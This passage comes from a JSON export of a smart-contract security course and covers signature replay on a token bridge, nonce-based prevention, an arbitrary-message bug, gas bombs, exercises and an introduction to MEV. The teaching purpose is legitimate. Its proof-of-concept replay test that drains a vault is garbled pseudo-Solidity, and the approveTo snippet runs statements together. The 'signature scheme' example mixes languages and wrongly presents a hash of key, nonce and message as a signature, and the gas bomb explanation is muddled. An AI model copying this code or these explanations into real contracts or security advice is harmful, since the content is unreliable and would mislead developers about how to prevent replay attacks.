          "markdownContent": "---\ntitle: Exploit - Signature Replay Minimized\n---\n\n\n\n---\n\n# Understanding Signature Replay Attacks: A Critical Look at Contemporary Blockchain Exploits\n\nLet's delve headfirst into one of the most recurrent threats on the blockchain- signature replay attacks. These attacks are unpleasantly commonplace and understanding them thoroughly is paramount in creating a secure, decentralized network. Now, signature replay attacks might sound menacingly complicated at first thought, but trust me, as we go through the concepts and how it actually happens, it will become significantly less intimidating!\n\nIn my quest to provide a hands-on understanding of these signature replay attacks, I have created a fantastic open-source repo, `sc-exploits-minimized`, that will allow you to fiddle with blockchain signatures and remix them as you'd like. It's a great playground to get those hands dirty, but for the sake of understanding, I find it easier to pull up the **SC Exploits Minimized Test Case Unit**, specifically `signatureReplaytest.sol` file, and witness how signature replay attacks unfold in reality.\n\n## The Anatomy of Signature Replay Attacks\n\nHere's a breakdown of how the signature replay attack operates in this particular test case. The process involves a victim and an attacker, each playing their parts in a scenario that very much reflects the real-world possibility of such attacks.\n\nHere's an overview of the function: `testSignatureReplay`.\n\n- Firstly, a victim deposits some funds into the protocol. It's like putting your money in a virtual safe.\n- Once deposited, they engage in all sorts of encoding activities.\n- The victim then signs the digest or the formatted message to get the V, R and S values- These are generated as part of the ECDSA (Elliptic Curve Digital Signature Algorithm) sign message function.\n- After signing the digest, they proceed to call `WithdrawBySIG` to withdraw the required amount.\n\nThis process, even though seems harmless, opens up a large vulnerability for potential attackers to exploit.\n\n```js\nfunction testSignatureReplay() public {\n    /* victim deposits into the protocol */\n    ...\n    /* encoding and digest signing to get V, R and S */\n    ...\n    /* victim calls 'WithdrawbySIG' */\n    ...\n    }\n```\n\n![](https://cdn.videotap.com/FIMkVw05x2zEDqU0YEm8-42.24.png)\n\n## Unpacking The Flaw\n\nSo where does it go wrong? Well, it's the post-withdrawal phase that introduces the opportunity for an attacker to wreak havoc. This is how it goes:\n\n- Upon seeing the V, R and S on-chain, the attacker realizes that there's nothing preventing it from being reused. In essentially, having this crucial V, R and S information plastered on the chain without protections is just begging an attacker to play around with it.\n- The attacker then proceeds to continuously call `WithdrawbySIG` until all the money is missing, effectively draining the victim's funds.\n\nKeep in mind that in this example, the attacker does not steal any money. Their primary goal is to kick the victim out of the protocol permanently, rendering any further transactions or involvement in the system impossible for the victim.\n\nItâ€™s essential to note that the lack of mechanism in place to prevent the V, R and S from being reused is the critical flaw in this script.\n\n> **_\"To tackle signature replay attacks effectively, you need to understand that the crux of the problem is the reuse of VR and S with no protective measures.\"_**\n\n## The Bigger Picture\n\nSignature replay attacks expose significant vulnerabilities in the blockchain system, making them a fertile ground for attackers to exploit. By understanding the nuts and bolts of these attacks, you can develop robust systems and strategies to circumvent these risks, contributing to a secure and more decentralized financial network.\n\nAs we dive deeper into this brave, new, decentralized world, remember that understanding is the first step towards prevention. We aren't just tech enthusiasts; we're defenders of the future of finance! Be vigilant and keep learning.\n",
          "updates": []
        },
        {
          "lessonId": "8ffdf897-73ba-4c5c-96c8-aa49a0c6f3ea",
          "number": 27,
          "title": "Signature Replay: Protection",
          "slug": "signature-replay-protection",
          "folderName": "27-signature-replay-protection",
          "description": "",
          "duration": 7,
          "videoUrl": "uwDa5bKISoR7P02zdfarzlffYREMj931TsFSkF1H028QA",
          "rawMarkdownUrl": "/routes/security/7-bridges/27-signature-replay-protection/+page.md",
          "markdownContent": "---\ntitle: Signature Replay Protection\n---\n\n\n\n---\n\n# Vulnerabilities Found in the V, R and S: A Deep Dive into Replay Protection\n\nWelcome to another deep dive into smart contract vulnerabilities. We're dissecting V, R and S -- a signature often found in blockchain technology.\n\n![](https://cdn.videotap.com/fepx5pOEwGHrxsJGEs9y-17.14.png)\n\nDuring this long and fascinating journey, we'll be breaking down each step to understand the vulnerabilities at a granular level. In particular, we'll be examining whether this signature benefits from replay protection. Spoiler alert: it doesn't. Let's delve in!\n\n## Crafting a Proof of Concept Code\n\nOur journey starts by raising a sobering question: Can this signature be deployed more than once? To answer this, we put together a proof-of-concept code that shows how this could potentially occur, leading to vulnerabilities.\n\n```javascript\nfunction testSignatureReplay() public {\n    uint vaultInitialBalance = 1000e18;\n    uint attackerInitialBalance = 100e18;\n    address attacker = makeAdr(attacker);\n    deal(address tokenAddress, vault, vaultInitialBalance);\n    deal(address tokenAddress, attacker, attackerInitialBalance);\n    uint v, bytes32 r, bytes32 s = vm.sign(private key ...);\n    bytesmemory message = abi.encode(address token, 0, encodeCall(IERC20.transferFrom(address vault, attacker, attackerInitialBalance) ));//in a loop until vault balance is zero\n    tokenbridge.withdrawTokensToL1(attacker, attackerInitialBalance, V, R, S);\n    assertEqual(token.balanceOf(address attacker), attackerInitialBalance + vaultInitialBalance);\n    assertEqual(token.balanceOf(address. Vault), 0);\n}\n```\n\nLet's break this down.\n\nThe function `testSignatureReplay()` assumes that a vault already holds some tokens. The initial balance of the vault and an attacker are given. The function then carries forth several deals. An attacker is set up who deposits tokens to a layer 2 (L2) chain.\n\n## Signature and Transfer\n\n```javascript\n uint v, bytes32 r, bytes32 s = vm.sign(private key ...);\n```\n\nThis part of our code does a bit of magic by signing the data with a private key. Thanks to Foundry, we can utilise a cheat code `VM.sign` to sign with the operator key, and then hash the actual data.\n\nThe next step is to formulate our `message`.\n\n```javascript\nbytes memory message = abi.encode(address token, 0, encodeCall(IERC20.transferFrom(address vault, attacker, attackerInitialBalance) ));\n```\n\nHere, we're essentially encoding a message instructing a transfer from the vault to the attacker. The signed message containing the V, R, and S values are usually what prompts MetaMask to ask for confirmation.\n\nThe signed message indicates a legitimate deposit of tokens from Layer 1 (L1) to L2. The operator, seeing this as valid, then submits V,R,and S on-chain.\n\nThis is the point where the replay attack becomes feasible. As soon as the operator's signature is placed on-chain, an attacker can simply keep invoking `withdrawTokensToL1` using that very same signature, draining balance from the vault until it's completely empty.\n\n## The Aftermath\n\nAnd how do we know it works? After running this function, we have successfully drained the vault entirely whilst increasing the attacker's balance accordingly:\n\n```javascript\nassertEqual(token.balanceOf(address attacker), attackerInitialBalance + vaultInitialBalance);\nassertEqual(token.balanceOf(address. Vault), 0);\n```\n\nIn short, we've just carried out a successful attack!\n\n## Wrapping up\n\nLooking at the given scenario, it becomes evident how signatures without replay protection, such as the one in our example, can pose significant security risks. Despite its relatively small codebase, such attacks can have substantial consequences. Always remember, when coding smart contracts, always ensure that your code includes mechanisms to prevent a replay attack.\n\nAudit data and additional findings related to the topic can be found in the corresponding Git Repo. Happy coding and be safe!\n\n> \"Security in blockchain technology involves a constant combat against potential threats and vulnerabilities.\"\n",
          "updates": []
        },
        {
          "lessonId": "eb2034da-2814-4886-8a0d-22708017cf33",
          "number": 28,
          "title": "Signature Replay: Prevention",
          "slug": "sig-replay-prevention",
          "folderName": "28-sig-replay-prevention",
          "description": "",
          "duration": 1,
          "videoUrl": "ifhNh02kZjmFSAHbVAKD02tcb4HwKmcejLxfUTWtmEs8s",
          "rawMarkdownUrl": "/routes/security/7-bridges/28-sig-replay-prevention/+page.md",
          "markdownContent": "---\ntitle: Sig Replay Prevention\n---\n\n\n\n---\n\n# The Art of Preventing Signature Replay Attacks\n\nHello there! In today's digital world, the protection of your data and privacy are of the utmost importance, especially when it comes to the vast field of cryptography. One common area where issues might arise involves signature replay attacks. Before we delve into the prevention methods, it's important to understand what these attacks are.\n\n![](https://cdn.videotap.com/5mzAbV6qyV86T7x1bv34-2.67.png)\n\nA signature replay attack involves an attacker illicitly using a data transmission or digital signature multiple times, potentially leading to fraudulent actions. In order to put a stop to this, the most prevalent method is to utilize something called 'nonces' or include a deadline. Curious to know more? Let's dive in.\n\n## Nonces â€“ A Key Combatant Against Replay Attacks\n\nA â€˜nonce,â€™ or â€˜number used once,â€™ is an arbitrary number that can be used precisely one time in a cryptographic communication. It is commonly a random or pseudo-random number, serving as one of the strongest safeguards against signature replay attacks. It's this concept that plays a pivotal role in preventing these types of attacks.\n\nThe mechanism is straightforward: We put some specific parameters into the signature. When the signature gets hashed, or signed, it can only be used one time.\n\n## Ensuring The Authentic Signature Sender\n\nOf course, the nonce method is just the start. To ensure the integrity of our message, it might also be necessary to verify that the initial signature was obtained from the actual sender or originator.\n\nConsider this: The first time a message is signed, it's crucial that the signature be from the _true_ signer. It sounds obvious, right, but how can we make sure of this?\n\nAgain, our solution lies in the way we handle and hash our signatures, in something called a digital signature scheme. A digital signature scheme ensures that each signature made on the same message is unique by varying a part of the cryptographic elements used in the signing process. It might sound a bit complex, but let's break it down with a simple code example:\n\n```js\nfunction sign(message, key, private_param);\nnonce = random.getrandbits(128) // create a 128-bit random nonce\nhashed_private_param = hashlib.sha256(private_param).hexdigest()\nhashlib.sha256(key + nonce + message + hashed_private_param).hexdigest() // hash the key, nonce, message, and hashed private_param, and return as a hex string\n```\n\nIn this code, weâ€™ve added one more parameter in the signing process, a private parameter that is unique for each sender. This element is hashed and added to our overall signature.\n\n## Conclusion\n\n> â€œAlways make sure your messages and signatures come with a one-time ticket â€“ The nonce.\"\n\nThe use of nonces, or one-time use data, in these signatures is a crucial element in ensuring that your digital signatures are protected from being misused. If utilized correctly, they can serve as a solid wall protecting you from the potential signature replay attacks. Generally, it all boils down to integrating this concept into the design and implementation of cryptographic systems.\n\nAs with any other part of cybersecurity, staying one step ahead of possible attackers is the name of the game, so it's essential to keep learning and adapting. Stay tuned for more updates and insights into the realm of cybersecurity!\n",
          "updates": []
        },
        {
          "lessonId": "3a1b25ed-a5e3-4c7b-a2c4-2fe61c02505b",
          "number": 29,
          "title": "Exploit: Low level call to itself",
          "slug": "low-level-exploit",
          "folderName": "29-low-level-exploit",
          "description": "",
          "duration": 2,
          "videoUrl": "qd5NSTSSWw302bgds6b1LKNcftp6u2EHj025k802fxlvSM",
          "rawMarkdownUrl": "/routes/security/7-bridges/29-low-level-exploit/+page.md",
          "markdownContent": "---\ntitle: Low-Level Exploit\n---\n\n\n\n---\n\n# Uncovering Hidden Bugs in Code Base: A Developer's Challenge\n\nToday, let's delve into a particularly intriguing part of the code base that's rife with at least two major bugs. I encourage you to dig deep, find these bugs, and thoughtfully attempt to write them out. If you don't grasp the explanation right away, don't be discouraged - just refer to the GitHub repository linked to this section for a more comprehensive understanding of these bugs.\n\nEven if the bugs are a bit cryptic in nature, Slither â€“ our static analysis tool â€“ has lobbed a figurative tip-off in our direction, indicating that things aren't all peaches and cream. So, let's proceed to unravel these bugs, shall we?\n\n### When Things Go Wrong\n\nThe first bug we have on our hands isn't as straightforward as it might initially seem. This bug is associated with a code snippet that Slither flagged as suspicious or possibly detrimental.\n\n```js\nsendToL1(Arbitrary_message);\n```\n\nIs Slither's panic alarm warranted in this situation? Unfortunately, the answer, in this case, is a resounding **yes**. The bug is not just bad, it's downright dreadful.\n\n#### Arbitrariness and the Hidden Flaws\n\nWhat's the core problem, you ask? It all pertains to the way the `sendToL1` function passes arbitrary messages. In simple terms, the function is just accepting any given inputs without any verification system, which could be a potential security risk.\n\nTo grasp this problem, we need to understand the `vault` and its `approveTo` function. This particular function can only be called upon by the `bridge`.\n\n```js\nfunction approveTo(Bridge, Token) // Can only be called by the bridge\nif (caller != Bridge){\n    throwToken.totalSupply -= caller.balancecaller.balance = 0\n    }\n```\n\nNow, imagine if someone triggers this `approveTo` function, passing malicious data asking the bridge to approve tokens for a hacker. Then, in record time, the hacker manages to drain all the tokens in the vault. Sounds like a dreadful fate, doesn't it? In the world of coding, this is just as destructive and catastrophic.\n\n> Quote: \"Bugs are like viruses - they can cause a minor irk or lead to a total system downfall.\"\n\n### Slither's Warning: A Red Flag\n\nAside from dire warnings about the first bug, Slither also gives us a prompt about another flaw in the system.\n\nIdentifying these issues is crucial for ensuring that our code remains secure, efficient, and, above all, bug-free. So, let's not sideline Slitherâ€™s red flags, and give them as much attention, if not more, as we would to the other parts of our code base.\n\n## Conclusion\n\nBugs in your code base can range from harmless to a total catastrophe. Understanding them, and more importantly, identifying them before they wreak havoc, is a crucial part of any developer's journey. SO tune in next time when we delve into more bugs and how to debug them efficiently.\n\nStay curious and keep coding!\n\n- Note: In case of any queries or difficulties in understanding the bugs, kindly refer to the associated GitHub repo for further explanation, or feel free to leave your questions in the comment section below.\n",
          "updates": []
        },
        {
          "lessonId": "79c17e62-5cdf-452a-b733-c84207283d0e",
          "number": 30,
          "title": "Exploit: Gas Bomb",
          "slug": "gas-bomb",
          "folderName": "30-gas-bomb",
          "description": "",
          "duration": 1,
          "videoUrl": "Gtt6PwqEuAVgUm1tNatgGY92DOHQPq3hCREGKuTK2gY",
          "rawMarkdownUrl": "/routes/security/7-bridges/30-gas-bomb/+page.md",
          "markdownContent": "---\ntitle: Exploit: Gas Bomb\n---\n\n\n\n---\n\n# Demystifying Gas Bomb and Other Blockchain Vulnerabilities\n\nThe world of blockchain is buzzing with fascinating features and vulnerabilities. One such intriguing element I'd like to shed some light on is the phenomena known as the gas bomb. This seemingly complex occurrence has sparked much debate, and I hope this post will provide you with some clarity on what exactly it is, how it works, and the kind of impact it can have.\n\n## What is a Gas Bomb Anyway?\n\nA gas bomb in blockchain terms is a low-level call where Solidity, the smart contract programming language, and the Ethereum Virtual Machine (EVM), the runtime environment, struggle to estimate the amount of computational effort (gas) needed to execute certain transactions.\n\n![](https://cdn.videotap.com/ffmuYOJbZ3iqYxllhGBD-5.94.png)\n\n> **Note**: Gas refers to the computational effort required to execute an operation in the Ethereum network.\n\nA malicious user can exploit this to trick the network into allocating absurd amounts of gas, and thereby charging other network participants excessively to execute a function.\n\n## Understanding the Implications\n\nWhat's interesting about gas bombs is how they're used in the network. For instance, while some users might employ this method to gain profits, others seem to have darker motivations. Often, these users utilise this exploit for seemingly no tangible benefits. Their motivations? To disrupt the system and cause chaos.\n\n> \"Some people just want to watch the world burn.\"\n\nIt's a poignant phrase that well encapsulates the mentality of these malicious actors. They create chaos without expecting any monetary gain in return. Their goal isnâ€™t to profit, but simply to disrupt the system - no rhyme, no reason, just pure anarchy.\n\n![](https://cdn.videotap.com/l0jIWaD8hhNflUJypCfy-22.29.png)\n\n## Ready To Dive Deep?\n\nIf by now, you're wrapped in a whirlwind of questions, I'm glad! Because what's learning without a little bit of challenge? But, if you're wondering what the hoo-ha I am talking about, now would be a good time to pause and take a breather.\n\nI encourage you to delve in, try to construct the proof of code for the vulnerabilities we discussed, and even to try your hand at crafting your gas bombs.\n\nTo get started, consider:\n\n1. Studying the structure of a low-level call in Solidity and the EVM,\n2. Understanding the significance of gas in the Ethereum network,\n3. Exploring how it's possible for the network to be fooled into allocating excess gas,\n4. Unveiling the motivations of malicious actors, and\n5. Learning how to protect yourself against such exploits.\n\nTo aid you in your quest, I've left a plethora of resources and exciting ensemble of ideas for you to navigate through in our [GitHub repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23).\n\n![](https://cdn.videotap.com/IqGVeU9yKyYfHHDeOCnY-41.6.png)\n\n## Never Stop Learning\n\nNow, we've been walking through these attacks, learning about them, discussing many proofs of code, and a lot of low-level calls. Remember, we are only at the beginning of our journey. Similar to any other journey you undertake, remember that what matters is your perseverance.\n\n> \"Pretty soon, you're going to need to start jogging or running.\"\n\nThe world of Blockchain is massive and ever-evolving. As we make our way through, be ready to pick up speed and adrenaline, from a casual amble to a determined sprint. I hope you are as excited as I am to continue this journey. Let's learn, explore, and grow together.\n",
          "updates": []
        },
        {
          "lessonId": "92f33e5e-6c4d-405c-8700-d14a85995179",
          "number": 31,
          "title": "Recap",
          "slug": "recap",
          "folderName": "31-recap",
          "description": "",
          "duration": 5,
          "videoUrl": "g23PPjlY5QwPaT2z8gmK1D3e02d25ztT02ZOrH01J02LGpA",
          "rawMarkdownUrl": "/routes/security/7-bridges/31-recap/+page.md",
          "markdownContent": "---\ntitle: Recap\n---\n\n\n\n---\n\n# ![Blockchain](https://images.unsplash.com/photo-1560185004-65a33335a867?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8) GUIDE TO WALLET KEY MANAGEMENT, EVM, DIFF AND THE IMPORTANCE OF POST DEPLOYMENT IN BLOCKCHAIN\n\nHello folks! You're in for an exciting ride as today we'll be diving deeper into the world of blockchain. We've covered a lot, but there's a whole universe waiting to be explored.\n\nBefore we jump into the next section, here's an assignment. Conduct a complete competitive audit. The essence of this exercise is to immerse you in Wallet Key management, which plays a significant role in blockchain.\n\nThere's more! We'll then delve into the depths of the Ethereum Virtual Machine (EVM), Yule, Huff and Opcodes. We will close our session with four of verification and formal verification, symbolic execution - a mandatory code review that will boost your understanding of the subject.\n\nBefore that, let's quickly touch upon a DeFi Stablecoin and discuss the crucial step of post-deployment.\n\nSo let's take a breath, buckle up and review what we have learned so far!\n\n## A Deep Dive into EVM Diff\n\nDid I mention we will be exploring EVM Diff also? It's a fantastic tool that allows for comparison of different chains, say Ethereum to Optimism or Arbitrum, highlighting the nuances between these chains.\n\nThrough EVM Diff, you can observe how the chain IDs, names, block explorers vary, and how precompiles work differently. This makes it a constructive tool to test compatibility across various EVM compatible chains.\n\n![](https://cdn.videotap.com/d3RNbllZQnlENKKuA1Rp-72.28.png)\n\nNow, it's not all smooth sailing. There might be some hiccups, like finding some precompiles in Arbitum which are absent in EVM or Arbitumâ€™s different transaction and signature types. Plus, their Opcodes function a bit differently, with some key Opcodes like Push Zero being unsupported on Arbitrum.\n\n## Harnessing the Power of Artificial Intelligence\n\n![](https://cdn.videotap.com/swSuUGyJFrnTQu8g4kzs-104.41.png)\n\nWe havenâ€™t delved too much into AI yet, but it's worth mentioning its relevance especially for the crypto enthusiast. Use AI, like Chat GPT, Elon Musk's new 'Find, Use Grok' to simplify things in blockchain. It can be a helpful tool when decoding intricate patterns or asking pertinent questions.\n\nIn our roadmap, we have upcoming plans for an AI helper for [Cyfrin Updraft](https://updraft.cyfrin.io) that will be a game-changer. So, that's something to look forward to!\n\n## The Importance of Checklist: A Lesson from Tenderly and The Hans\n\nYes, the age-old practice of running through checklists is crucial, even in something as modern as blockchain.\n\nAlthough we didnâ€™t discuss [Tenderly](https://tenderly.co/), it's a notable tool in this domain. Our focus was on the lessons from 'the Hans' stressing on the essentiality of having a checklist. These lists keep you on track, enabling a methodical approach to your manual review process.\n\n## Understanding Precompiles, Private Keys and Signatures\n\nWe mentioned polygon precompile during our case study, emphasizing on how crucial it is to cross-verify and how failing to do so can be costly.\n\nWe've delved into the concept of public and private keys and how these signatures work on-chain. The importance of nonce in signature replays was discussed - they work as a one-time pass for usage ensuring your signatures don't get misused.\n\nWe touched on several critical aspects, like undertaking low-level calls and dealing with the sign in it, and also brushed up on L1s and L2s.\n\n![](https://cdn.videotap.com/wx8Rvhp7nAsmP3hocQLb-200.78.png)\n\nBy now, you should be competent enough to write your own Proof of Concepts (POCs). The ball is in your court!\n\n## Historic Bridge Hacks - Ronan, Polly Nomad and Wormhole\n\nWe intentionally didn't touch upon these major blockchain hacks. Each of these hacks had a devastating effect, with losses running into hundreds of millions. However, they were mainly due to centralized processes, rather than any significant bug.\n\nReading [Rekt.news](https://www.rekt.news/) articles about these hacks will help you comprehend the magnitude of these events. The rise of protocols like chainlink CCIP is to address these vulnerabilities, aiming to diminish our reliance on centralized technology.\n\nThis is a lot to absorb, but remember, the world of crypto and blockchain is a non-stop learning journey. So keep exploring and evolving.\n",
          "updates": []
        },
        {
          "lessonId": "239c896a-8965-4e4a-93dc-495f581939b1",
          "number": 32,
          "title": "Exercises",
          "slug": "exercises",
          "folderName": "32-exercises",
          "description": "",
          "duration": 2,
          "videoUrl": "umaQ401mT6GCPgv3q3hN3q18xsx01eu53hjeuIutYVbdQ",
          "rawMarkdownUrl": "/routes/security/7-bridges/32-exercises/+page.md",
          "markdownContent": "---\ntitle: Exercises\n---\n\n\n\n---\n\n# Decoding Blockchain Security: Navigating Attacks, and Ensuring Web Three Safety\n\nThe life of a security researcher is one of constant growth and learning. If you've completed this course and you're looking for the next steps and next actions you can take to better yourself in this space, we've provided some great suggestions:\n\nExercises:\n\n1. [Damn Vulnerable DeFi Challenges](https://www.damnvulnerabledefi.xyz/) 1, 2, 4\n2. Write a tweet thread about an interesting [finding from Solodit](https://solodit.xyz/)\n3. Tweet about how you finished the hardest audit yet!\n4. Read about more historic attacks:\n   - [Signature Replay](https://solodit.xyz/issues/router-signatures-can-be-replayed-when-executing-messages-on-the-destination-domain-spearbit-connext-pdf)\n   - [Merkle tree signature issues](https://solodit.xyz/issues/m-14-merkle-tree-related-contracts-vulnerable-to-cross-chain-replay-attacks-code4rena-factorydao-factorydao-contest-git)\n   - [Polygon Double Spend](https://medium.com/immunefi/polygon-double-spend-bug-fix-postmortem-2m-bounty-5a1db09db7f1)\n   - [Nomad Bridge Hack](https://medium.com/immunefi/hack-analysis-nomad-bridge-august-2022-5aa63d53814a)\n\n## Hands-on Security Research with Solodit\n\nNow to add a little fun to the mix. Visit Solodit, discover something that piques your interest, investigate old reported issues, and get on Twitter to share your findings! Why?\n\nCreating a tweet thread about your discoveries will help you consolidate knowledge, engage with peers and seasoned pros, and gain valuable insights on the topic. Not to mention, you could be setting the foundation for your personal brand in the security research field. So donâ€™t shy away from sharing; this field thrives on collaborative knowledge sharing â€“ the more you share, the more you learn.\n\n## The Journey Through Boss Bridge and Beyond\n\nCongratulations are in order! You've conquered Boss Bridge and are on the brink of completing part one of this extensive dive into blockchain security. This is hard stuff, no doubt. But you're standing tall, arms loaded with hefty concepts, embracing the weird and the wonderful in the world of blockchain security.\n\nThrough this hurdle-ridden journey, you've gleaned a wealth of knowledge, but we're not done just yet. Let's pause for an important interlude - a pit-stop at miner extractable value (MEV).\n\n## The Unskippable Chapter on Miner Extractable Value (MEV)\n\nâ€œWhile it's optional to do the Vault guardians audit or security review, learning about the miner extractable value (MEV) is obligatory. All our contracts could be susceptible to MEV-related breaches\" - this just goes to show the significance of understanding miner extractable value (MEV) in the world of blockchain.\n\nIn the sections ahead, we'll dive into what MEV is, why it matters, and how we can fortify our contracts against potential issues stemming from it.\n\nNow, go ahead and take that well-deserved break, grab that cup of coffee or make that gym run. Come back refreshed, because we've got a lot more in store for you!\n\n## Wrapping Up\n\nThe world of technology is akin to a vast ocean, full of wonderful discoveries, but also home to some beastly challenges. This journey isn't meant to be a smooth sail. It's hard, and itâ€™s meant to be. Embrace this rollercoaster ride and let the knowledge you gain empower you to make Web Three safer for all of us.\n\nSo kudos to you for making it this far; remember to rest and prepare for the next stint. Until then, happy learning!\n",
          "updates": []
        }
      ]
    },
    {
      "number": 8,
      "sectionId": "ed2143d3-17a0-4394-b225-f930e295ac04",
      "title": "MEV & Governance",
      "slug": "mev-and-governance",
      "folderName": "8-mev-and-governance",
      "lessons": [
        {
          "lessonId": "72251a4f-bba8-4c71-a8e6-5df9a58f0517",
          "number": 1,
          "title": "Introduction",
          "slug": "introduction",
          "folderName": "1-introduction",
          "description": "",
          "duration": 1,
          "videoUrl": "rcS02v21CEbLI8Nme5pkCNHzcPypVaNL6Zd1FtxKSTbo",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/1-introduction/+page.md",
          "markdownContent": "---\ntitle: Introduction\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n# The Power of Repetition in Cybersecurity Research\n\nHello and welcome back! I certainly hope you've been embarking on the tasks and exercises that we've been laying out because their impact on your skillset cannot be overstated. As we reminded you at the beginning and will reiterate now, *repetition is the mother of skill*. The more time and effort you spend refining your abilities through practical application, the better you will get.\n\n## The Importance of Exercises\n\nDelving into these exercises is not simply a suggestion â€” it's an indispensable step towards heightening your aptitude. They serve as the stepping stones that pave the path to your mastery. So, prioritize these exercises and practice regularly. Their rewards are directly proportionate to the effort you invest.\n\n> \"*The more you do this, the better you will get. Doing these exercises is really important and really going to level you up.*\"\n\nAbundant in the nature of our work as cybersecurity researchers, or, as we like to say, security \"research-ers\", is the onus of extensive research.\n\n## Learning: A Continuous Journey\n\nAs we strive to fortify Web 3.0 and make the Internet safer, truly grasping that learning is not a destination but a continuous journey becomes a fundamental realization. In this pursuit of knowledge and endless learning, honing the skill of learning how to learn is paramount.\n\n> \"In this quest to keep web3 safer, you will be continuously learning. You will always be on the path for learning. So learning how to learn is going to be a great skill for you.\"\n\nEveryone has a unique learning style â€” what works for one person may not work for another. Therefore, itâ€™s imperative to identify which process best suits your style of learning. Be it visual learning through infographics and diagrams, auditory learning through podcasts and audio lectures, or kinesthetic learning through hands-on, practical tasks, understanding and adapting to your preferred style can significantly contribute to your learning efficiency.\n\nObserve, adapt, and develop a process that works best for you. To retain as much information as possible from each lesson, experiment with different learning strategies and stick to the one with which you resonate the most.\n\n## Wrapping Up\n\nLearning is a continuous journey, especially in the field of cybersecurity where new trends and threats emerge regularly. Embrace the grind, value the process of learning and remember, it's the repetition of efforts that lead to perfection. Each task you complete, every solution you find, and every mistake you learn from takes you one step closer to becoming a seasoned cybersecurity researcher.\n\nSo, let us put these words into action and continue dedicating time to exercises and persistent learning. The path forward is filled with endless knowledge and it's time we kept walking on it.\n\nStay safe, and keep researching!",
          "updates": []
        },
        {
          "lessonId": "ae4c5de7-7f2a-4cc1-ae5d-17419374c389",
          "number": 2,
          "title": "Perseverance",
          "slug": "perseverance",
          "folderName": "2-perseverance",
          "description": "",
          "duration": 3,
          "videoUrl": "1Qz2YH01L1v00UbX1g02RwfshNHnZPuUHPw1HBjca5n01Gc",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/2-perseverance/+page.md",
          "markdownContent": "---\ntitle: Perserverance\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n\n# Why are we not going to audit Vault Guardians together? \n\nOriginally Section Eight was designed to act as our final boss vault; an encompassing guardians security review or audit. However, upon reflection, I've decided that we're going to break this up and let you into the complexity of this code base one piece at a time. \n\nAnd YOU my friend, you can go back and audit [Vault Guardians yourself](https://github.com/Cyfrin/8-vault-guardians-audit) :) \n\n## Vault Guardians\n\n<img src=\"/security-section-8/2-perserverance/vault-guardians.png\" style=\"width: 100%; height: auto;\" alt=\"vault guardians\">\n\nSo we aren't going to audit this one together, but we are going to go over some of the attack vectors you'll find in this codebase. And after we do that, you can either:\n\n1. Audit Vault Guardians\n2. Start a competitive [CodeHawks](https://www.codehawks.com/) competitive audit\n\n> \"The reason that this is so big and this is such a monster of a final audit or security review is because you will get good and you will have to get good at coming to a code base and saying, I can do this. I can complete this. This looks overwhelming to me, but it's okay because I know I'm going to come out the other side triumphantly.\"\n\n## Teamwork Makes the Dream Work\n\nIn the vast realms of smart contract security, it's not all about solo missions. Teaming up with somebody else is an incredibly powerful move. Find a buddy in the [Codehawks/Cyfrin Discord]() to share your thoughts, brainstorm, and code together. This is not just about sharing the workload but learning how others think about attack vectors, and figuring out different strategies of how they approach this maze of codes. So sync up with someone, share your findings and grow together.\n\nDespite splitting up these sections, Section Eight remains our final boss. We won't go over it in this post, but don't feel left adrift. There's an audit data branch where you can check the answers and use as reference.\n\n## We start with MEV\n\nSo... To recap.\n\n1. We are going over some exploits in this section, in particular:\n   1. MEV\n   2. Governance Attacks\n2. And then, to finish part 1 of the security course, you can either:\n   1. Audit Vault Guardians\n   2. Start a competitive [CodeHawks](https://www.codehawks.com/) competitive audit\n\nSo... LETS GET IT!",
          "updates": []
        },
        {
          "lessonId": "d3108829-ec37-4d38-a00f-af90d5f990d5",
          "number": 3,
          "title": "MEV: Introduction",
          "slug": "mev-introduction",
          "folderName": "3-mev-introduction",
          "description": "",
          "duration": 4,
          "videoUrl": "3EveL1jnQyw1MiIlwT5qq8x4iNPqFJBAiduhGUKPNQQ",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/3-mev-introduction/+page.md",
          "markdownContent": "---\ntitle: MEV - Introduction\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n## What is MEV?\n\nMev stands for \"Maximum Extractable Value\" and it's the value that blockchain node operators and users can extract by ordering transactions in a block in a specific order. \n\nIn order to develop an in-depth understanding, I would highly recommend visiting [Flashbots.net](https://www.flashbots.net/), a research and development organization dedicated to counteracting the negative implications of MEV. Their 'New to MEV' page, in particular, is a fantastic learning resource.\n\n## What is the mempool? \n\n<img src=\"/security-section-8/3-mev-introduction/regular-transaction.png\" style=\"width: 100%; height: auto;\" alt=\"regular transaction\">\n\nWhen a transaction is initiated, it is directed to a specific node which, instead of immediately integrating it into its block, places it into its 'memory pool', or 'mempool'. This constitutes the lower tier of workings that enable blockchain.\n\n<img src=\"/security-section-8/3-mev-introduction/mempool.png\" style=\"width: 100%; height: auto;\" alt=\"mempool\">\n\nAs we know, Ethereum is a Proof-of-stake blockchain and the nodes essentially \"take turns\" building blocks for the blockchain. So if you send your transaction to a single node, the node will have to wait until it's that nodes turn to include your transaction! This could take months! So what the node does is that accepts your transaction, and will often \"fan out\" your transaction to other nodes. \n\nIf it's one of the other nodes turns to build the block, if you sent enough of a tip (gas) with your transaction, the node will include your transaction in the block.\n\nSo this \"mempool\" is like a waiting room for transactions.\n\n## Front-running\n\n<img src=\"/security-section-8/3-mev-introduction/mev.svg\" style=\"width: 100%; height: auto;\" alt=\"front-running\">\n\nSuppose you're a malicious user and want to use this to your advantage. You have the ability to scan the mempool, essentially predicting future transactions. Let's say User A is malicious, and sees someone make a transaction that is going to make them $100. \n\n...Well User A might just say \"Hey! I want to make $100!\"\n\nSo what User A can do is something called *front-running*. They can send their *own* transaction *ahead* of your transaction to extra some value. The only reason they are able to extract this value is because they were able to see your transaction ahead of time. \n\nFront-running is one of the most common forms of MEV.",
          "updates": []
        },
        {
          "lessonId": "79a5fc3d-3b95-40d2-a993-07ac09a132cb",
          "number": 4,
          "title": "MEV: Minimized",
          "slug": "mev-minimized",
          "folderName": "4-mev-minimized",
          "description": "",
          "duration": 1,
          "videoUrl": "j1F002AUlf7n4FGid4AwVqOPtNm9FjsOOffo01iifRjgY",
